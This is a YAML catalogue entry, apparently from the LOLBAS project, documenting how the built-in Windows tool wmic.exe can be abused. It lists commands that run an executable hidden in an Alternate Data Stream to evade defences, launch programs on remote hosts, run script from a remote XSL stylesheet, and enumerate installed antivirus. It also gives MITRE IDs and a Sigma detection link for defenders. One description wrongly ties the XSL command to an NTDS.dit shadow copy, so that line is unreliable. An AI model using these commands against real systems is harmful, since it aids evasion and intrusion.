      document_utf8: "---\nName: Wmic.exe\nDescription: The WMI command-line (WMIC) utility provides a\
        \ command-line interface for WMI\nAuthor: Oddvar Moe\nCreated: 2018-05-25\nCommands:\n  - Command:\
        \ wmic.exe process call create \"{PATH_ABSOLUTE}:program.exe\"\n    Description: Execute a .EXE\
        \ file stored as an Alternate Data Stream (ADS)\n    Usecase: Execute binary file hidden in Alternate\
        \ data streams to evade defensive counter measures\n    Category: ADS\n    Privileges: User\n\
        \    MitreID: T1564.004\n    OperatingSystem: Windows vista, Windows 7, Windows 8, Windows 8.1,\
        \ Windows 10, Windows 11\n    Tags:\n      - Execute: EXE\n  - Command: wmic.exe process call\
        \ create \"{CMD}\"\n    Description: Execute calc from wmic\n    Usecase: Execute binary from\
        \ wmic to evade defensive counter measures\n    Category: Execute\n    Privileges: User\n    MitreID:\
        \ T1218\n    OperatingSystem: Windows vista, Windows 7, Windows 8, Windows 8.1, Windows 10, Windows\
        \ 11\n    Tags:\n      - Execute: CMD\n  - Command: wmic.exe /node:\"192.168.0.1\" process call\
        \ create \"{CMD}\"\n    Description: Execute evil.exe on the remote system.\n    Usecase: Execute\
        \ binary on a remote system\n    Category: Execute\n    Privileges: User\n    MitreID: T1218\n\
        \    OperatingSystem: Windows vista, Windows 7, Windows 8, Windows 8.1, Windows 10, Windows 11\n\
        \    Tags:\n      - Execute: CMD\n      - Execute: Remote\n  - Command: wmic.exe process get brief\
        \ /format:\"{REMOTEURL:.xsl}\"\n    Description: Create a volume shadow copy of NTDS.dit that\
        \ can be copied.\n    Usecase: Execute binary on remote system\n    Category: Execute\n    Privileges:\
        \ User\n    MitreID: T1218\n    OperatingSystem: Windows vista, Windows 7, Windows 8, Windows\
        \ 8.1, Windows 10, Windows 11\n    Tags:\n      - Execute: XSL\n      - Execute: Remote\n  - Command:\
        \ wmic.exe process get brief /format:\"{PATH_SMB:.xsl}\"\n    Description: Executes JScript or\
        \ VBScript embedded in the target remote XSL stylsheet.\n    Usecase: Execute script from remote\
        \ system\n    Category: Execute\n    Privileges: User\n    MitreID: T1218\n    OperatingSystem:\
        \ Windows vista, Windows 7, Windows 8, Windows 8.1, Windows 10, Windows 11\n    Tags:\n      -\
        \ Execute: XSL\n      - Execute: Remote\n  - Command: wmic.exe datafile where \"Name='C:\\\\windows\\\
        \\system32\\\\calc.exe'\" call Copy \"C:\\\\users\\\\public\\\\calc.exe\"\n    Description: Copy\
        \ file from source to destination.\n    Usecase: Copy file.\n    Category: Copy\n    Privileges:\
        \ User\n    MitreID: T1105\n    OperatingSystem: Windows vista, Windows 7, Windows 8, Windows\
        \ 8.1, Windows 10, Windows 11\n  - Command: WMIC.exe /Namespace:\\\\\\\\root\\\\SecurityCenter2\
        \ Path AntiVirusProduct Get displayName,productState\n    Description: Executes WMIC to gather\
        \ the existing Antivirus or EDR solution installed on the machine.\n    Usecase: Recon\n    Category:\
        \ Execute\n    Privileges: User\n    MitreID: T1518.001\n    OperatingSystem: Windows vista, Windows\
        \ 7, Windows 8, Windows 8.1, Windows 10, Windows 11\n    Tags:\n      - Execute: Discovery\n \
        \     - Execute: Antivirus Enumeration\nFull_Path:\n  - Path: C:\\Windows\\System32\\wbem\\wmic.exe\n\
        \  - Path: C:\\Windows\\SysWOW64\\wbem\\wmic.exe\nDetection:\n  - Sigma: https://github.com/SigmaHQ/sigma/blob/683b63f8184b93c9564c4310d10c571cbe367e1e/rules/windows/image_load/image_load_wmic_remote_xsl_scripting_dlls.yml\n\
